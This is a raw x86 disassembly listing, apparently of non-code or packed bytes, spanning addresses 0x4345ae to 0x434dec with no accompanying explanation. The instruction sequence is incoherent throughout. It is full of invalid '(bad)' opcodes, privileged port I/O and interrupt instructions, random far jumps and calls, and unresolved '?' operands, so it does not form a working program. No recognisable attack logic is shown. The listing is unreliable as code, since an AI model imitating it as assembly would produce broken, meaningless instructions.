  4345ae:	xchg   esp,eax
  4345af:	sub    dh,cl
  4345b1:	push   esp
  4345b2:	sar    DWORD PTR [eax+0x6],cl
  4345b5:	js     0x4345c2
  4345b7:	mov    dh,0x10
  4345b9:	push   ds
  4345ba:	push   edx
  4345bb:	clc    
  4345bc:	add    BYTE PTR [esi+0x518e4c9d],bh
  4345c2:	cmp    BYTE PTR [eax+0x33c290],ch
  4345c8:	pop    eax
  4345c9:	inc    esi
  4345ca:	dec    eax
  4345cb:	pusha  
  4345cc:	xchg   esp,eax
  4345cd:	je     0x434610
  4345cf:	call   0x4e65a65b
  4345d4:	ficom  DWORD PTR [ecx+0x6]
  4345d7:	push   es
  4345d8:	nop
  4345d9:	lahf   
  4345da:	(bad)
  4345dd:	imul   ecx,DWORD PTR [ebp+0x45],0x1a
  4345e1:	pop    esp
  4345e2:	ins    BYTE PTR es:[edi],dx
  4345e3:	xor    dl,BYTE PTR [eax]
  4345e5:	imul   esp,edx,0xffffff86
  4345e8:	js     0x4345ba
  4345ea:	icebp  
  4345eb:	inc    ebp
  4345ec:	popa   
  4345ed:	sub    DWORD PTR ds:0x2d2a0e1a,ebx
  4345f3:	stos   BYTE PTR es:[edi],al
  4345f4:	and    al,0x43
  4345f6:	pop    ebx
  4345f7:	sbb    BYTE PTR [esi-0x20],dh
  4345fa:	inc    esi
  4345fb:	and    eax,0x43073608
  434600:	push   0x582882df
  434605:	add    al,0xff
  434607:	cs dec ecx
  434609:	pop    ss
  43460a:	xor    al,0x28
  43460c:	mov    cl,0x42
  43460e:	push   ebx
  43460f:	add    al,cl
  434611:	fisubr DWORD PTR [ebp-0x55]
  434614:	jo     0x434660
  434616:	call   0xa6ff:0x24b8ae28
  43461d:	fsub   QWORD PTR [eax]
  43461f:	push   esi
  434620:	jl     0x43463d
  434622:	aam    0xa2
  434624:	xor    al,0xc5
  434626:	xchg   esp,eax
  434627:	mov    dl,0x4d
  434629:	adc    eax,0x34b1a8cf
  43462e:	jl     0x4345f4
  434630:	mov    WORD PTR [edi+ecx*1-0x4566aadb],bp
  434638:	dec    esp
  434639:	dec    esp
  43463a:	imul   eax,ebp,0x78
  43463d:	adc    bl,BYTE PTR [esi]
  43463f:	sbb    edx,DWORD PTR [edi+ebp*1]
  434642:	pushf  
  434643:	stos   BYTE PTR es:[edi],al
  434644:	xchg   DWORD PTR [eax+0x48c2301a],esp
  43464a:	js     0x434697
  43464c:	sbb    bh,BYTE PTR [ebx]
  43464e:	ins    BYTE PTR es:[edi],dx
  43464f:	adc    esi,DWORD PTR [esp+eax*8]
  434652:	jl     0x4345e0
  434654:	mov    esi,0x1b11bc9c
  434659:	js     0x43468d
  43465b:	hlt    
  43465c:	jp     0x43460b
  43465e:	fnstcw WORD PTR [eax+0x51]
  434661:	mov    ds:0x487379a0,al
  434666:	mov    ds,WORD PTR [ebx-0x26d2ffef]
  43466c:	pusha  
  43466d:	jno    0x434650
  43466f:	adc    eax,0x59602a8c
  434674:	xor    bh,bh
  434676:	jne    0x434625
  434678:	sub    DWORD PTR [edx+0x48],edi
  43467b:	or     dl,BYTE PTR ds:0x1d9a32d3
  434681:	xchg   esp,eax
  434682:	sar    BYTE PTR [ebp+0x4e4a278e],1
  434688:	in     eax,0xa8
  43468a:	jecxz  0x4346c6
  43468c:	mov    edx,ebx
  43468e:	(bad)  
  43468f:	mov    cs,WORD PTR [esp+ecx*2]
  434692:	add    al,0x94
  434694:	mov    ds:0x8e2746d6,al
  434699:	mov    ds:0x327b614f,al
  43469e:	sub    cl,BYTE PTR [edi+0x52]
  4346a1:	loope  0x434630
  4346a3:	xchg   edx,eax
  4346a4:	push   ebp
  4346a5:	sti    
  4346a6:	sub    BYTE PTR [esi+0x38],0x0
  4346aa:	pop    edi
  4346ab:	popa   
  4346ac:	cld    
  4346ad:	addr16 push 0x14
  4346b0:	dec    sp
  4346b2:	push   0x4a274345
  4346b7:	mov    ecx,0xd70cafbe
  4346bc:	mov    ah,BYTE PTR [esi]
  4346be:	jnp    0x43473e
  4346c0:	dec    ebx
  4346c1:	pop    eax
  4346c2:	mov    al,ds:0x30467504
  4346c7:	xlat   BYTE PTR ds:[ebx]
  4346c8:	loopne 0x434724
  4346ca:	cmp    DWORD PTR [ebp-0x45a1f3aa],0xfffffffd
  4346d1:	dec    esp
  4346d2:	add    BYTE PTR [ecx-0x6c],0xca
  4346d6:	xor    eax,0xad849e8
  4346db:	cld    
  4346dc:	gs dec edx
  4346de:	or     BYTE PTR [ebp+esi*1+0x48aed8ab],0x4
  4346e6:	sbb    al,BYTE PTR [esi+ecx*4]
  4346e9:	inc    ecx
  4346ea:	fsub   QWORD PTR [ebp+0x21082782]
  4346f0:	and    al,0xb0
  4346f2:	fiadd  DWORD PTR [ecx+0x1c26c0c7]
  4346f8:	pop    ecx
  4346f9:	xchg   BYTE PTR [esi+0x260b3cd],al
  4346ff:	lds    esp,FWORD PTR [ecx]
  434701:	clc    
  434702:	imul   ebx,DWORD PTR [edx+0x681334c8],0xdf245532
  43470c:	pop    esi
  43470d:	adc    al,0xc0
  43470f:	imul   esp,DWORD PTR [ecx+0x4697ba3d],0x4835549b
  434719:	fs adc eax,0x745a3c8e
  43471f:	aaa    
  434720:	fwait
  434721:	jp     0x434724
  434723:	xor    al,0x76
  434725:	push   0x41f33c1e
  43472a:	mov    esp,0xd920f404
  43472f:	or     bh,dl
  434731:	clc    
  434732:	data16 test al,0x8f
  434735:	shl    BYTE PTR [esi+0x46],cl
  434738:	jl     0x434722
  43473a:	sar    BYTE PTR [eax],1
  43473c:	sbb    BYTE PTR [eax-0x2f757c7f],dl
  434742:	test   DWORD PTR [eax+ebx*2],esp
  434745:	inc    edx
  434746:	cwde   
  434747:	dec    edi
  434748:	stos   BYTE PTR es:[edi],al
  434749:	pop    ebx
  43474a:	inc    esp
  43474b:	retf   0xb2f6
  43474e:	jmp    0x12ed:0x82ac3822
  434755:	pop    ebp
  434756:	sub    dh,al
  434758:	add    ebx,DWORD PTR ds:[edi]
  43475b:	lods   eax,DWORD PTR ds:[esi]
  43475c:	inc    edi
  43475d:	mov    eax,0xd294833f
  434762:	test   eax,0x17a25063
  434767:	inc    edx
  434768:	sub    bh,BYTE PTR cs:[ebp-0x2bbec9f0]
  43476f:	repz out dx,eax
  434771:	loopne 0x43473e
  434773:	cmp    al,0xad
  434775:	sbb    ebp,DWORD PTR ds:[ebp-0x68711bd2]
  43477c:	inc    eax
  43477d:	xlat   BYTE PTR ds:[ebx]
  43477e:	ret    0x86f7
  434781:	sbb    DWORD PTR ds:0x12fe480a,eax
  434787:	aam    0x1e
  434789:	mov    BYTE PTR [edx+0x1e804e4e],al
  43478f:	pop    ds
  434790:	fisubr DWORD PTR [edx+0xb65d899]
  434796:	mov    ah,0x4d
  434798:	mov    ebp,0xa8b0a4f4
  43479d:	xor    al,0x9a
  43479f:	inc    ecx
  4347a0:	cmp    al,0xf8
  4347a2:	lahf   
  4347a3:	test   BYTE PTR ds:0x3c081f03,cl
  4347a9:	imul   ah
  4347ab:	xchg   DWORD PTR [edx+0x4008f8d3],ecx
  4347b1:	mov    ecx,0x92b7223e
  4347b6:	xor    al,BYTE PTR [esi]
  4347b8:	rcl    al,1
  4347ba:	mov    esp,0x5e5a5c35
  4347bf:	xchg   ecx,eax
  4347c0:	jne    0x4347c2
  4347c2:	xor    ebp,ebx
  4347c4:	adc    al,0xda
  4347c6:	cmp    DWORD PTR [esi],0x5a
  4347c9:	pop    eax
  4347ca:	pusha  
  4347cb:	inc    ebp
  4347cc:	cmc    
  4347cd:	dec    edx
  4347ce:	or     BYTE PTR [edi],al
  4347d0:	push   cs
  4347d1:	fdivr  st,st(0)
  4347d3:	ins    BYTE PTR es:[edi],dx
  4347d4:	jmp    0x8ec2dbc
  4347d9:	test   DWORD PTR [edi],esp
  4347db:	mov    BYTE PTR ds:0x46ce9eed,al
  4347e1:	fwait
  4347e2:	or     al,0x95
  4347e4:	pop    edx
  4347e5:	and    BYTE PTR [esi+0x9],ch
  4347e8:	dec    edi
  4347e9:	jmp    0x881c:0xb2f6d0f5
  4347f0:	lods   eax,DWORD PTR ds:[esi]
  4347f1:	mov    ch,0x15
  4347f3:	fs into 
  4347f5:	pop    esi
  4347f6:	dec    ebx
  4347f7:	lods   al,BYTE PTR ds:[esi]
  4347f8:	(bad)  
  4347f9:	xchg   ecx,eax
  4347fa:	mov    al,0x5d
  4347fc:	add    cl,BYTE PTR [ebx]
  4347fe:	inc    ebp
  4347ff:	jbe    0x4347bd
  434801:	arpl   sp,ax
  434803:	mov    bl,0xa1
  434805:	inc    ecx
  434806:	aam    0x48
  434808:	je     0x434840
  43480a:	mov    dh,0x8c
  43480c:	and    eax,0xb490fa6c
  434811:	out    0x9a,al
  434813:	mov    al,ds:0x4ffa24cc
  434818:	mov    dh,0x6b
  43481a:	add    BYTE PTR [edi+0x6a2e0c45],bh
  434820:	cli    
  434821:	pop    ebx
  434822:	jae    0x4347e5
  434824:	mov    dl,BYTE PTR [esi+0x22]
  434827:	mov    BYTE PTR [eax+0x66],al
  43482a:	fild   WORD PTR [eax]
  43482c:	push   ebx
  43482d:	repz fmul QWORD PTR [ebp+0xbb60890]
  434834:	sbb    edi,DWORD PTR [eax+0x720c5ee0]
  43483a:	mov    edx,0x76068f68
  43483f:	js     0x4347c7
  434841:	(bad)  
  434842:	fcom   st(5)
  434844:	xor    BYTE PTR [eax+0x47],0x47
  434848:	xor    ecx,edx
  43484a:	(bad)  
  43484b:	jbe    0x4347d1
  43484d:	test   BYTE PTR [ecx],bh
  43484f:	test   BYTE PTR [esi-0x5996947e],0x7e
  434856:	mov    BYTE PTR [ebp+0x4a08a530],bh
  43485c:	loop   0x43485f
  43485e:	rcl    BYTE PTR [eax-0x3d92c123],0x36
  434865:	pop    esp
  434866:	push   0x89c9fea3
  43486b:	xlat   BYTE PTR ds:[ebx]
  43486c:	cs aaa 
  43486e:	mov    esp,0x80111874
  434873:	iret   
  434874:	mov    al,ds:0xc86c9856
  434879:	push   eax
  43487a:	inc    esi
  43487b:	adc    ecx,DWORD PTR [eax+0x21699fc2]
  434881:	push   0xffffff93
  434883:	dec    eax
  434884:	inc    esi
  434885:	fisub  DWORD PTR [eax-0x5eda2fe2]
  43488b:	loope  0x43485d
  43488d:	retw   0x36b3
  434891:	loop   0x4348ff
  434893:	test   al,0xfa
  434895:	mul    BYTE PTR ss:[edi-0x22]
  434899:	xor    eax,0x2dc29c8
  43489e:	sbb    ebx,DWORD PTR [esi]
  4348a0:	or     DWORD PTR [esi+0x137fc2ab],esp
  4348a6:	cli    
  4348a7:	add    dl,bl
  4348a9:	daa    
  4348aa:	(bad)  
  4348ab:	in     al,0x3e
  4348ad:	call   0x28ac:0x283080dc
  4348b4:	sub    dl,al
  4348b6:	jbe    0x4348dc
  4348b8:	xlat   BYTE PTR ds:[ebx]
  4348b9:	sbb    al,0x6e
  4348bb:	and    BYTE PTR [esi-0xd8aaada],ah
  4348c1:	xchg   esp,eax
  4348c2:	push   ds
  4348c3:	int3   
  4348c4:	ds push edx
  4348c6:	and    al,0x24
  4348c8:	dec    esp
  4348c9:	ror    DWORD PTR [edi+eiz*2-0x26],1
  4348cd:	sbb    dl,bh
  4348cf:	mov    BYTE PTR [edx],cl
  4348d1:	adc    eax,0xe0559255
  4348d6:	lods   al,BYTE PTR ds:[esi]
  4348d7:	pop    ss
  4348d8:	add    eax,0xf03a04cf
  4348dd:	dec    ecx
  4348de:	dec    eax
  4348df:	pop    esi
  4348e0:	pop    bx
  4348e2:	xchg   ecx,eax
  4348e3:	clc    
  4348e4:	and    eax,0xaef422b5
  4348e9:	add    bl,dh
  4348eb:	xchg   DWORD PTR [esi+0x51],ebx
  4348ee:	ins    DWORD PTR es:[edi],dx
  4348ef:	pop    esp
  4348f0:	sub    al,0x8f
  4348f2:	pushf  
  4348f3:	adc    al,0xfa
  4348f5:	bound  eax,QWORD PTR [eax]
  4348f7:	jl     0x434956
  4348f9:	mov    bh,0xa1
  4348fb:	push   es
  4348fc:	imul   ebx,DWORD PTR [edx+0x6852da40],0xffffff98
  434903:	or     al,0x1
  434905:	pop    edx
  434906:	pop    edi
  434907:	cli    
  434908:	cmp    edi,DWORD PTR [esi+0x66c52606]
  43490e:	ss adc al,0x28
  434911:	push   ebp
  434912:	call   0x76a16b14
  434917:	call   0x70d8:0x8dc53400
  43491e:	sub    BYTE PTR [edi+0x10],bh
  434921:	push   0xffffffd5
  434923:	ins    BYTE PTR es:[edi],dx
  434924:	pop    edi
  434925:	xor    al,0xd8
  434927:	lahf   
  434928:	loop   0x43491b
  43492a:	shufps xmm7,XMMWORD PTR [eax+0x24],0xd0
  43492f:	push   ecx
  434930:	dec    eax
  434931:	loope  0x434987
  434933:	rol    BYTE PTR [ecx+eax*1],1
  434936:	push   edx
  434937:	push   ebp
  434938:	add    DWORD PTR [eax+esi*1],ecx
  43493b:	call   0x78bac742
  434940:	add    eax,0x77fa5aa1
  434945:	in     al,dx
  434946:	or     BYTE PTR [ebp+ecx*1-0x61],dh
  43494a:	inc    edx
  43494b:	stos   DWORD PTR es:[edi],eax
  43494c:	mov    al,ds:0xf2c93a30
  434951:	pop    eax
  434952:	add    dl,BYTE PTR [edi+0x48]
  434955:	in     eax,dx
  434956:	or     DWORD PTR [eax+0x1758f2cd],0xfffffff4
  43495d:	or     BYTE PTR [ecx],ch
  43495f:	mov    WORD PTR [esi+0x2e94d807],fs
  434965:	je     0x43495d
  434967:	ret    0xa144
  43496a:	mov    al,ds:0x381809d6
  43496f:	call   0xb4440220
  434974:	fsub   QWORD PTR [ebx+edx*1+0x5a]
  434978:	mov    ?,edx
  43497a:	add    al,0xa9
  43497c:	adc    eax,DWORD PTR [ecx-0x53]
  43497f:	shl    BYTE PTR [esi],0x7d
  434982:	pop    eax
  434983:	jmp    0xf154d812
  434988:	add    eax,0xbc884360
  43498d:	sbb    eax,0x82f605e6
  434992:	push   eax
  434993:	push   ss
  434994:	hlt    
  434995:	lahf   
  434996:	sbb    DWORD PTR [eax+edi*2],0x2a68952
  43499d:	push   eax
  43499e:	xchg   esi,eax
  43499f:	xor    ah,0x89
  4349a2:	fiadd  DWORD PTR [edi]
  4349a4:	loop   0x434939
  4349a6:	aam    0x32
  4349a8:	es mov dh,0xd8
  4349ab:	and    dl,BYTE PTR [eax]
  4349ad:	sbb    DWORD PTR [esi+0xc808781],edi
  4349b3:	inc    ecx
  4349b4:	adc    al,0xf8
  4349b6:	or     ebp,DWORD PTR [eax+0x58d55132]
  4349bc:	dec    eax
  4349bd:	add    bh,cl
  4349bf:	retf   0xa5c6
  4349c2:	push   0x3c
  4349c4:	inc    ecx
  4349c5:	jb     0x4349f1
  4349c7:	es ins DWORD PTR es:[edi],dx
  4349c9:	dec    ebp
  4349ca:	push   0xc60411d1
  4349cf:	clc    
  4349d0:	retf   0x78dd
  4349d3:	inc    edi
  4349d4:	shl    dh,0xe4
  4349d7:	push   0xffffff94
  4349d9:	(bad)  
  4349da:	adc    BYTE PTR [esi+0x65],dh
  4349dd:	push   ss
  4349de:	ss lahf 
  4349e0:	cmp    BYTE PTR [esi],0x53
  4349e3:	xchg   BYTE PTR [ecx],ah
  4349e5:	inc    eax
  4349e6:	in     al,0xd7
  4349e8:	inc    ecx
  4349e9:	rol    DWORD PTR [edi],cl
  4349eb:	test   ecx,edx
  4349ed:	add    BYTE PTR [edi],dl
  4349ef:	call   0x4db94644
  4349f4:	push   0x41
  4349f6:	mov    ds:0x7a561090,al
  4349fb:	jno    0x434992
  4349fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4349fe:	ja     0x434a58
  434a00:	nop
  434a01:	js     0x434a04
  434a03:	repz fadd DWORD PTR [edx+0x0]
  434a07:	mov    esi,0xa136a230
  434a0c:	add    al,0x14
  434a0e:	or     al,BYTE PTR [eax-0x7d]
  434a11:	jmp    0xd17d:0x8cc78d11
  434a18:	ins    BYTE PTR es:[edi],dx
  434a19:	mov    ds:0x78915e5e,eax
  434a1e:	add    edx,ecx
  434a20:	rcr    DWORD PTR [eax-0x44],cl
  434a23:	fidiv  DWORD PTR [ebp+0x20178827]
  434a29:	cmp    ch,bl
  434a2b:	push   esi
  434a2c:	sahf   
  434a2d:	and    esp,DWORD PTR [ecx+0x2c48e823]
  434a33:	lock xchg ecx,eax
  434a35:	sub    bl,BYTE PTR [edx-0x29c9fd83]
  434a3b:	add    edi,DWORD PTR [eax]
  434a3d:	ins    BYTE PTR es:[edi],dx
  434a3e:	ret    
  434a3f:	shr    DWORD PTR [esi],0x6a
  434a42:	adc    BYTE PTR [esi-0x5b59112a],dh
  434a48:	aas    
  434a49:	add    BYTE PTR [ecx+0x52],ah
  434a4c:	dec    ebx
  434a4d:	dec    esp
  434a4e:	push   edi
  434a4f:	inc    esi
  434a50:	or     BYTE PTR [edx+esi*4+0x5],ch
  434a54:	and    dh,BYTE PTR ds:0xc8548c90
  434a5a:	rcl    BYTE PTR [eax],cl
  434a5c:	aas    
  434a5d:	dec    ecx
  434a5e:	in     al,dx
  434a5f:	push   0xa9008316
  434a64:	je     0x434ade
  434a66:	jns    0x434a33
  434a68:	and    al,0xd8
  434a6a:	arpl   WORD PTR [eax],cx
  434a6c:	pop    esp
  434a6d:	push   esi
  434a6e:	imul   edx,eax,0xb8742205
  434a74:	mov    ds:0x78cc173c,al
  434a79:	jmp    0xa099:0x8815d162
  434a80:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  434a82:	repnz push cs
  434a84:	ret    0xf682
  434a87:	pusha  
  434a88:	mul    BYTE PTR [eax+0x18bad57c]
  434a8e:	bound  ebp,QWORD PTR [ebp+0x3a0be0a0]
  434a94:	pop    esi
  434a95:	and    al,0x34
  434a97:	mov    dh,BYTE PTR [edi]
  434a99:	pop    esi
  434a9a:	fild   DWORD PTR [ecx-0x7e]
  434a9d:	bound  eax,QWORD PTR [ebx-0x3fd7b05c]
  434aa3:	push   ss
  434aa4:	outs   dx,BYTE PTR ds:[esi]
  434aa5:	or     DWORD PTR [edi-0x57],ecx
  434aa8:	sbb    dh,ch
  434aaa:	xor    al,0xca
  434aac:	push   0x4fda26cf
  434ab1:	adc    esp,eax
  434ab3:	outs   dx,DWORD PTR ds:[esi]
  434ab4:	jmp    0x728b:0x32ba2e91
  434abb:	rcr    al,0xe2
  434abe:	fwait
  434abf:	inc    esp
  434ac0:	add    cl,BYTE PTR [esi+esi*1+0x1739f416]
  434ac7:	push   ecx
  434ac8:	pop    ebp
  434ac9:	in     eax,dx
  434aca:	or     esp,edx
  434acc:	shl    dl,0x14
  434acf:	into   
  434ad0:	sub    al,0x3d
  434ad2:	inc    ebx
  434ad3:	test   DWORD PTR [edx+ecx*4+0x8cc9cd0],eax
  434ada:	or     al,0x53
  434adc:	add    DWORD PTR [esi-0x32],esi
  434adf:	pop    esp
  434ae0:	cmp    eax,0xf016f788
  434ae5:	sbb    DWORD PTR [edx-0x4b],edx
  434ae8:	pushf  
  434ae9:	pop    eax
  434aea:	jmp    0x350c:0xa1d06a85
  434af1:	mov    esi,0x90f84b4
  434af6:	or     ebx,DWORD PTR [edx+esi*1-0x3506420a]
  434afd:	test   BYTE PTR [edx],0x38
  434b00:	mov    ebp,ss
  434b02:	mov    WORD PTR [esp+edx*2+0x0],es
  434b06:	ds call 0xc245:0xb028c9ee
  434b0e:	and    eax,0xfd84d6bd
  434b13:	test   BYTE PTR [ebx+eiz*2],0x53
  434b17:	xchg   edx,eax
  434b18:	add    al,0x2b
  434b1a:	imul   esi,DWORD PTR [edx],0x5a
  434b1d:	mov    es,WORD PTR ds:0x6d0d1f6
  434b23:	iret   
  434b24:	in     al,dx
  434b25:	jns    0x434b2b
  434b27:	mov    eax,0xed103612
  434b2c:	xor    eax,DWORD PTR [ebp+0x27629806]
  434b32:	sub    BYTE PTR [edi],dl
  434b34:	enter  0x82b6,0x43
  434b38:	dec    edx
  434b39:	pop    eax
  434b3a:	pop    edx
  434b3b:	js     0x434bb9
  434b3d:	or     esp,DWORD PTR [esi-0x7d8793fc]
  434b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434b44:	(bad)  
  434b45:	push   edi
  434b46:	xchg   ebx,eax
  434b47:	inc    edx
  434b48:	(bad)  
  434b49:	fwait
  434b4a:	jp     0x434b9f
  434b4c:	mov    ch,0x3b
  434b4e:	add    al,0x9f
  434b50:	dec    ebp
  434b51:	dec    eax
  434b52:	or     al,0x53
  434b54:	in     al,0x48
  434b56:	ret    0xc89c
  434b59:	mov    dh,0x43
  434b5b:	sbb    dl,cl
  434b5d:	aaa    
  434b5e:	pop    esi
  434b5f:	sub    BYTE PTR [edi],ch
  434b61:	dec    esp
  434b62:	mov    ds:0xe266b62,al
  434b67:	sub    ah,dh
  434b69:	call   0x5af0:0xc5be605e
  434b70:	shl    BYTE PTR [edi],cl
  434b72:	fcomp  QWORD PTR [edx-0x1889d1e3]
  434b78:	jp     0x434be3
  434b7a:	jmp    0x903e:0xbeb8c697
  434b81:	mov    cl,0x74
  434b83:	adc    al,0x7c
  434b85:	adc    DWORD PTR [edx+edi*1-0x34],esi
  434b89:	jo     0x434b39
  434b8b:	jge    0x434ba4
  434b8d:	push   esi
  434b8e:	sub    DWORD PTR [ecx+0x66],eax
  434b91:	xchg   esi,eax
  434b92:	pusha  
  434b93:	lock xchg esi,eax
  434b95:	inc    eax
  434b96:	mov    eax,ds:0xd49dd4d9
  434b9b:	dec    esi
  434b9c:	inc    edx
  434b9d:	aam    0x86
  434b9f:	test   BYTE PTR [eax-0x1f24fbb0],0xd9
  434ba6:	test   DWORD PTR [eax],0xc0ed5110
  434bac:	lods   eax,DWORD PTR ds:[esi]
  434bad:	inc    eax
  434bae:	pop    ds
  434baf:	out    dx,al
  434bb0:	inc    esp
  434bb1:	sti    
  434bb2:	sub    BYTE PTR [esp+eax*1],dh
  434bb5:	add    DWORD PTR [edx],ecx
  434bb7:	sbb    eax,0x84ee58d3
  434bbc:	adc    eax,0x2ab04753
  434bc1:	dec    edx
  434bc2:	loopne 0x434b8e
  434bc4:	or     BYTE PTR ds:0x6643f20d,al
  434bcb:	sbb    BYTE PTR [ebx+ebx*4+0x0],dl
  434bcf:	sub    BYTE PTR [edx+edx*4+0x70],ch
  434bd3:	into   
  434bd4:	fmul   st(7),st
  434bd6:	inc    ecx
  434bd7:	inc    esp
  434bd8:	xor    esp,0xebdee188
  434bde:	mov    es,WORD PTR [edi]
  434be0:	imul   esi,ecx,0xffffffc8
  434be3:	xchg   esp,eax
  434be4:	movhps xmm6,QWORD PTR [edx-0x4b]
  434be8:	mov    eax,ss:0x1cc488ed
  434bee:	and    ch,BYTE PTR [edx-0xc]
  434bf1:	and    dl,BYTE PTR [eax+0x2b1483d3]
  434bf7:	mov    esi,0xf35208a0
  434bfc:	ret    0x1a8e
  434bff:	and    DWORD PTR [ecx+0x6216548f],0x27
  434c06:	aas    
  434c07:	cmp    al,dh
  434c09:	mov    fs,WORD PTR [ebx]
  434c0b:	loop   0x434c44
  434c0d:	sbb    eax,0xd6eacaec
  434c12:	push   eax
  434c13:	sti    
  434c14:	and    dh,ah
  434c16:	mov    al,BYTE PTR [esi+edx*2]
  434c19:	pop    ss
  434c1a:	ds aas 
  434c1c:	mov    edx,0x691e92f0
  434c21:	repnz dec edi
  434c23:	into   
  434c24:	outs   dx,DWORD PTR ds:[esi]
  434c25:	imul   edi,edi,0xffffffa0
  434c28:	das    
  434c29:	mov    al,ds:0xdc0d326d
  434c2e:	loop   0x434bba
  434c30:	mov    al,cs:0x5083e1d8
  434c36:	pop    edx
  434c37:	pop    ebp
  434c38:	cld    
  434c39:	sub    eax,DWORD PTR [edx]
  434c3b:	or     DWORD PTR [ecx],esi
  434c3d:	call   0xc24a:0x11eab18e
  434c44:	pop    edx
  434c45:	xchg   ebx,eax
  434c46:	sub    dh,BYTE PTR [eax+0x30]
  434c49:	loope  0x434c5e
  434c4b:	rcl    dh,1
  434c4d:	sub    ah,bh
  434c4f:	mov    eax,0xccc0f4a3
  434c54:	cmp    al,0x12
  434c56:	push   ecx
  434c57:	gs out 0x92,al
  434c5a:	(bad)  
  434c5b:	sar    BYTE PTR [ebx+0x65fa993d],cl
  434c61:	inc    esi
  434c62:	pop    ecx
  434c63:	sti    
  434c64:	mov    fs,WORD PTR ds:0x69414154
  434c6a:	neg    BYTE PTR [eax-0x10]
  434c6d:	jne    0x434c90
  434c6f:	jmp    0x63bb715
  434c74:	jl     0x434cd7
  434c76:	jo     0x434c63
  434c78:	mov    bl,BYTE PTR [edx+0x36]
  434c7b:	push   edx
  434c7c:	xlat   BYTE PTR ds:[ebx]
  434c7d:	ds xchg edx,eax
  434c7f:	ss jle 0x434ceb
  434c82:	push   esp
  434c83:	or     cl,BYTE PTR [ebp+ebx*1+0x46]
  434c87:	mov    eax,0xa02f00ef
  434c8c:	rcr    BYTE PTR [eax+eax*1],1
  434c8f:	test   al,0xac
  434c91:	pop    ecx
  434c92:	les    ebx,FWORD PTR [edx+0x58]
  434c95:	pusha  
  434c96:	push   esi
  434c97:	push   es
  434c98:	dec    edi
  434c99:	aam    0x38
  434c9b:	shl    DWORD PTR [edi],0xa0
  434c9e:	fnsave [edx-0x14]
  434ca1:	ret    0x46aa
  434ca4:	mov    edx,0x692df599
  434ca9:	out    dx,al
  434caa:	out    0x18,eax
  434cac:	mov    dh,BYTE PTR [eax+0x214040c0]
  434cb2:	cmp    BYTE PTR [eax+0x15],0xbc
  434cb6:	and    dh,BYTE PTR [ecx+0x20990fe4]
  434cbc:	mov    eax,0x2d226046
  434cc1:	xor    al,0xd
  434cc3:	fwait
  434cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434cc5:	repnz cs adc esi,edx
  434cc9:	xchg   esi,eax
  434cca:	mov    al,cs:0xbefa81e1
  434cd0:	cmp    eax,0x6878caa1
  434cd5:	cdq    
  434cd6:	(bad)  
  434cd7:	jl     0x434d4c
  434cd9:	mov    ds:0x6a22e1cc,eax
  434cde:	mov    edx,0x439500ea
  434ce3:	lds    esp,FWORD PTR [esi+0xa428135]
  434ce9:	lods   al,BYTE PTR ds:[esi]
  434cea:	dec    eax
  434ceb:	in     al,dx
  434cec:	and    eax,0x31c6dcb4
  434cf1:	mov    dh,0xce
  434cf3:	mov    eax,0xe451d68c
  434cf8:	rcl    DWORD PTR [eax-0x23eca7d4],cl
  434cfe:	or     al,BYTE PTR [ebx-0x53]
  434d01:	adc    eax,0x327c1012
  434d06:	mov    ?,WORD PTR [esp+edi*8+0x12]
  434d0a:	xchg   edx,eax
  434d0b:	dec    edx
  434d0c:	sbb    eax,0xb5a660c
  434d11:	sub    BYTE PTR [eax-0x66],ch
  434d14:	jle    0x434cf8
  434d16:	(bad)  
  434d17:	rcl    DWORD PTR [edx],cl
  434d19:	inc    ebp
  434d1a:	sbb    DWORD PTR [edi],ebx
  434d1c:	popa   
  434d1d:	adc    al,0x62
  434d1f:	mov    ecx,0x1f8c219c
  434d24:	sub    BYTE PTR [edx+0x490a483e],0xa2
  434d2b:	adc    ah,BYTE PTR [eax]
  434d2d:	or     edi,DWORD PTR ds:0xd88527e1
  434d33:	push   ss
  434d34:	push   esi
  434d35:	stos   DWORD PTR es:[edi],eax
  434d36:	inc    esp
  434d37:	mov    ecx,0x220d818e
  434d3c:	into   
  434d3d:	enter  0x9bcc,0xf2
  434d41:	ss jmp 0xa87eb797
  434d47:	fstp   QWORD PTR [ebx]
  434d49:	ror    BYTE PTR [ebp-0x2a],1
  434d4c:	adc    dh,BYTE PTR [ebx-0x6ddd5557]
  434d52:	repz rcr dh,0x26
  434d56:	arpl   WORD PTR [edi+0x1],ax
  434d59:	lea    ebp,[ebx+eiz*2+0x7a418b4]
  434d60:	mov    BYTE PTR [edx-0x5de6dbbd],al
  434d66:	aas    
  434d67:	inc    eax
  434d68:	and    eax,0x834240f4
  434d6d:	retf   0xa3fe
  434d70:	adc    bh,BYTE PTR [ebx+eax*8+0x58]
  434d74:	test   BYTE PTR [eax+edi*4+0x74433cb1],bl
  434d7b:	inc    edx
  434d7c:	push   eax
  434d7d:	fs add al,0x39
  434d80:	lock and BYTE PTR [ebx+0x2c3e1b08],bl
  434d87:	inc    esp
  434d88:	call   0xb624:0xfc9b06b0
  434d8f:	inc    ebx
  434d90:	mov    ds:0x36b682d4,al
  434d95:	or     ch,BYTE PTR [esi+0x1f016325]
  434d9b:	and    al,0x5a
  434d9d:	retf   0x1a3f
  434da0:	mov    al,ds:0x4ab6363d
  434da5:	(bad)  
  434da6:	cmp    DWORD PTR [ebp+0x6e],0xffffffcb
  434daa:	jmp    0x434d76
  434dac:	jo     0x434d8e
  434dae:	nop
  434daf:	jp     0x434df5
  434db1:	data16 cld 
  434db3:	leave  
  434db4:	and    al,0x9c
  434db6:	push   0x38
  434db8:	adc    BYTE PTR [ebp-0x61c2668e],dh
  434dbe:	test   dl,bl
  434dc0:	xor    al,BYTE PTR [eax]
  434dc2:	stos   DWORD PTR es:[edi],eax
  434dc3:	adc    eax,0xe275e893
  434dc8:	mov    ebx,0xf8cbd093
  434dcd:	push   0xffffffcb
  434dcf:	ins    BYTE PTR es:[edi],dx
  434dd0:	sub    ch,0x38
  434dd3:	xor    al,0xb4
  434dd5:	push   edx
  434dd6:	gs in  al,0x78
  434dd9:	inc    edx
  434dda:	jb     0x434e2a
  434ddc:	pop    ss
  434ddd:	imul   esi,DWORD PTR [esi],0x70
  434de0:	popa   
  434de1:	mov    WORD PTR [ebx+0x56],cs
  434de4:	int3   
  434de5:	fsub   QWORD PTR [edx-0x51fac8da]
  434deb:	lods   al,BYTE PTR ds:[esi]
  434dec:	or     BYTE PTR [eax],0x85
